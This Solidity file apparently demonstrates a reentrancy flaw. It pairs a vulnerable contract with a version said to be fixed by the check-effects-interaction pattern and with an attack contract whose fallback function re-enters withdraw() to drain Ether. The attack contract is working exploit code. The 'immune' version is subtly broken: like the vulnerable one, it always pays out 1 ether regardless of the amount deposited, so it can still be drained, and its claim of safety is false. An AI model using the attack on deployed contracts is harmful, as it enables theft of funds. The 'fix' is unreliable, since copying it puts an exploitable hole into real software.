pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool sent, ) = msg.sender.call{value: 1 ether}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
}


contract ImmuneContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    //fixed the reentrancy issue by using Check-Effect-Interaction patter
    function withdraw() public {
        uint balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: 1 ether}("");
        require(sent, "Failed to send Ether");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackContract {
    IVulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerableContract(_vulnerableContract);
    }

    // Fallback function is called when AttackContract receives Ether
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
